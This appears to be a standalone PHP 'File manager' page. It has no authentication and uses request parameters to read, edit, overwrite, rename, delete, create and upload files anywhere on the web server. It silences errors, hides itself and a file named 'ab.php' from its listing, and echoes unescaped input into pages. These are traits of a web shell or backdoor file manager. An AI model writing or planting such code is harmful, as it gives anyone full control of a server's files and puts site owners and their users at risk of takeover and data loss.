<?php
error_reporting(0);

//*** Load Info
$filename = $_SERVER['SCRIPT_NAME'];  //this script name

if(isset($_POST['edit_saveFile'])){
  $fd_name = $_GET['folder'];
  header("location: {$filename}?folder={$fd_name}&act=open");
}
?>
<!--<body></body>-->
<!DOCTYPE html>
<html lang="en">
<head>
<meta name="viewport" content="width=device-width, intial-scale=1">
<meta name="author" content="N/A" />
<meta name="description" content="File manager"/>
<title> File manager - FREEHAND_EDIT_MODE </title>
<style type="text/css">
@charset "utf-8";
/* CSS Document */

.ta-cont{
   text-align: center;
   display: block;
}
textarea:focus{
    border-color: #03a9f7;
}
textarea {
    border: 1px solid #aaaaaa;
    border-radius: 5px;
    padding: 4px;
    margin-bottom: 1px;
    outline: none;
    width: 96%;
    display: inline-block;
    height: 400px;
    font-family: Courier;
    text-size: 18px;
    font-weight: bold; 100;
    tab-size: 4;
    word-spacing: -1px;
    line-height: 1.3;
}
.ec-sub{
    width: 100%;
    display: block;
    padding: 5px;
    font-size: 20px;
    margin-top: 5px;
    margin-bottom: 9px;
}
input[type="submit"] {
    color: #FFF;
    font-weight: bold;
    background-color: #008080;
    outline: none;
}

* {margin:0px; padding:0px;}
body {
    font-family:"Times New Roman", Times, serif;
    max-width: 700px;
    margin: auto;
}
a { padding-left:5px; padding-right:5px}
a:link, a:active, a:visited {
color : #1f8ba0;
text-decoration : none;
}
a:hover, a:focus {
border-bottom: 1px dotted #1f8ba0;
}
p {margin-left:10px; padding:5px;}
.mnu {background-color : #93db2e; padding-left:8px; padding:5px;}
input:hover, input:focus {
    box-shadow: 0px 0px 10px rgba(228, 79, 38, 1);
}
h3 {background-color:#6A1EC3; padding:5px;color:#fff;}
input, select {
    border: 1px solid rgba(129, 33, 128, 1);
	border-radius: 4px;
    border-top-left-radius: 4px;
    border-top-right-radius: 4px;
    border-bottom-right-radius: 4px;
    border-bottom-left-radius: 4px;
	padding: 4px;
    padding-top: 4px;
    padding-right-value: 4px;
    padding-bottom: 4px;
    padding-left-value: 4px;
    padding-left-ltr-source: physical;
    padding-left-rtl-source: physical;
    padding-right-ltr-source: physical;
    padding-right-rtl-source: physical;
}

form {
	background-color: #FAFFF0;
}
th {color:#F00;}
td {color:#060;}
.cntr {text-align:center}
.board { margin-top:4px; text-align:justify;}
.msg {background-color:#FADBC7; padding:5px; margin-bottom:5px;}
.mnu3 {background-color : #93db2e; padding-left:8px; font-size:14px; text-align:center;}
.rtm {padding-left:20px;}
.smnu {text-align:center;}
.mnu2 {text-align:center; background-color:#eee;}
.menu {text-align:center; background-color:#ddd; margin-bottom:1px}
tt {color:#963:}
.chat{border: 1px solid #bcd2ee; line-height: 1.3em; margin: 4px; padding: 5px; position: relative; text-align: left; border-radius: 4px; overflow: scroll;}
.xmenu {color: #333333; border: 1px solid #fc0; background-color: #ffffcc; margin: 3px; padding: 5px 5px 5px; border-radius:4px;}
.blok { border: 1px solid #414040; padding: 0px;; margin-left:3px; margin-right:3px; margin-top:5px; margin-bottom:4px; border-radius:4px;} 
</style>
</head>
<body>
<h3> File manager </h3>
<?php
//*** Login

//*** load Request
// file
if (isset($_REQUEST['file']))
{
    $file = $_REQUEST['file'];
    }else {
        $file = '';
};

//folder
if (isset($_REQUEST['folder']))
{
    $folder = $_REQUEST['folder'];
}else {
    $folder = '.';
};
//act
if (isset($_REQUEST['act']))
{
  $act = $_REQUEST['act'];  
}else {
   $act = 'Home'; 
};
//sub act 
if (isset($_REQUEST['']))
{
    
}else {
    
};
//*** Explorer 
  // *****
  
// delete system turn off for more security... act
    
   function listFolderFiles($dir,$exclude,$filename){
    $ffs = scandir($dir);
    echo '<div class="blok"><div class="chat"><table border="1">';
    foreach($ffs as $ff){
        if(is_array($exclude) and !in_array($ff,$exclude)){
            if($ff != '.' && $ff != '..'){
            if(!is_dir($dir.'/'.$ff)){
               $ltr = ltrim($dir.'/'.$ff,'./');
         echo '<tr><td>' . $ff .  "</td><td> <a href='$ltr'>Browser</a> </td><td> <a href='$filename?filex=$ltr&act=delete&folder=$dir'>Delete</a> </td><td> <a href='$filename?file=$ltr&act=rename&folder=$dir'>Rename</a> </td><td> <a href='$filename?file=$ltr&act=edit&folder=$dir'>Edit</a> </td><td>". FileSizeConvert(filesize($ltr)). "</td></tr>";
           
            } else {
          $ltr = ltrim($dir.'/'.$ff,'./');
             echo '<tr><th>'. $ff . "</th><td> <a href='$filename?folder=$ltr&act=open'>Open</a> </td><td> <a href='$filename?filex=$ltr&act=delete'>Delete</a> </td><td> <a href='$filename?folder=$ltr&act=rename'>Rename</a> </td>";
            
            }
            }
        }
    }
    echo '</table></div></div>';


};

// *** Functions ;

function FileSizeConvert($bytes)
 {
     $bytes = floatval($bytes);
         $arBytes = array(
             0 => array(
                 "UNIT" => "TB",
                 "VALUE" => pow(1024, 4)
             ),
             1 => array(
                 "UNIT" => "GB",
                 "VALUE" => pow(1024, 3)
             ),
             2 => array(
                 "UNIT" => "MB",
                 "VALUE" => pow(1024, 2)
             ),
             3 => array(
                 "UNIT" => "KB",
                 "VALUE" => 1024
             ),
             4 => array(
                 "UNIT" => "B",
                 "VALUE" => 1
             ),
         );
  $result = null;
     foreach($arBytes as $arItem)
     {
         if($bytes >= $arItem["VALUE"])
         {
             $result = $bytes / $arItem["VALUE"];
             $result = str_replace(".", "." , strval(round($result, 2)))." ".$arItem["UNIT"];
             break;
         }
     }
     return $result;
 }
// ** Static
// Home
function home()
{
   echo '<title> IO </title>'; 
 
};
function Upload()
{
   echo ' <title> upload </title>'; 
};
function login()
{
  echo '<title> Login </title>';  
};
// ** dynamic
// delete
function delTree($dir) {
   $files = array_diff(scandir($dir), array('.','..'));
    foreach ($files as $file) {
      (is_dir("$dir/$file")) ? delTree("$dir/$file") : unlink("$dir/$file");
    }
    return rmdir($dir);
  }; 

function delete($dename) {

    
    if (is_dir($dename)) {
      if(delTree($dename)) {
        echo $dename." has been deleted.";
      } else {
        
        echo "There was a problem deleting this directory. ";
      }
    } else {
      if(unlink($dename)) {
        echo $dename." has been deleted.";
      } else {
        echo "There was a problem deleting this file. ";
      }
    }
  
};
// Edit
function edit($file,$filename,$folder)
{
  if (!$file == '')
  {
    $text = file_get_contents($file);
    $text = htmlentities($text);
  echo "<form action='{$filename}?folder={$folder}&act=open' method='POST'>";
  echo "<input type='hidden' name='act' value='edit'>";
  echo "<div class='ta-cont'><textarea name='text'>$text</textarea></div>";
  echo "<input type='hidden' name='folder' value='$folder'>";
  echo "<input type='hidden' name='file' value='$file'>";
  echo "<input type='hidden' name='edit_saveFile' value='true'>";
  echo "<input class='ec-sub' type='submit' name='ok' value='Save'></form>";
    
  }else
  {
    echo '<p> File Not selected </p>';
  };
    
};
// rename
function ren($file,$filename,$folder)
{
    
    echo "<form action='$filename' method='POST'>";
    echo "<Input type='text' name='rfile' value='$file'>";
    echo "<input type='hidden' name='rnam' value='$file'>";
    echo "<input type='hidden' name='folder' value='$folder'>";
    echo "<input type='hidden' name='act' value='rename'>";
    echo "<input type='submit' name='newname' value='Change'></form>";
};
// Upload 

// new file folder create
function create($path,$type)
{
   if ($type == 'file') 
   {
    fopen($path,"w");
   }
   else
   {
    mkdir($path,0777);
   }
};
// *** Work
switch ($act)
{
  
case 'home':
    home();
break;
case 'login':
break;
    case 'edit':
    if (isset($_REQUEST['ok']))
    {
          file_put_contents($file,$_REQUEST['text']);
    } else
    {
       edit($file,$filename,$folder); 
    };
    
    break;
    //111111111111111111111
    case 'delete':
      delete($_REQUEST['filex']) ; 
 
    break;
    case 'rename': 
       if (isset($_REQUEST['rnam']))
       {
        rename($_REQUEST['rnam'],$_REQUEST['rfile']);
       }else
       {
         if (!is_dir($file))
{
    ren($file,$filename,$folder);
}else
{
   ren($folder,$filename,$folder); 
};
};
//111111111111111
      break;
      case 'newfile' :
      {
        if (isset($_REQUEST['type']))
        {
            if ($_REQUEST['type'] == 'folder')
            {
                create($folder . '/' . $_REQUEST['newfile'],'folder');
            }
            else
            {
                create($folder.'/'.$_REQUEST['newfile'],'file');
            }
        } else
        {
            echo "<form action='$filename' method='POST'>";
            echo "<input type='text' name='newfile' value=''>";
            echo "<input type='hidden' name='folder' value='$folder'><select name='type'>
  <option value='file'>File</option>
  <option value='folder'>Folder</option>
</select> ";
echo "<input type='submit' name='act' value='newfile'></form>";
        }
      };
      break; 
      //11111111111111111
      case 'upload':
      {
       echo 'upload'; 
      
      
if (isset($_REQUEST['uploaded']))
{
      $target_path = $_REQUEST['folder'];
if ($target_path == '.')
{
    $target_path = $_ENV['DOCUMENT_ROOT'];
};

$target_path = $target_path .'/'. basename( $_FILES['uploadedfile']['name']); 

if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
    echo "The file ".  basename( $_FILES['uploadedfile']['name']). 
    " <h2>has been uploaded</h2>";
} else{
    echo "<h3>There was an error uploading the file, please try again!</h3>";
	move_uploaded_file($_FILES['uploadedfile']['tmp_name'], __DIR__);
	
}
       
     }else{
        echo "<form ENCTYPE='multipart/form-data' action='$filename' method='POST'>";
        echo "<input name='uploadedfile' type='file' />";
        echo "<input type='hidden' name='folder' value='$folder'>";
        echo "<input type='hidden' name='act' value='upload'>";
        echo "<input type='submit' name='uploaded' value='upload'></form>";
       } 
     };
      break;
};

echo "<div class='menu'> <div class='blok'><div class='xmenu'>
<a href='$filename?act=home'>Home</a>-<a href='$filename?act=upload&folder=$folder'>Upload</a>-<a href='$filename?act=newfile&folder=$folder'>New</a>
</div></div></div>";
listFolderFiles($folder,array($filename,'ab.php'),$filename);  
?>
<h3> Simple File manager </h3>


</body>
</html>
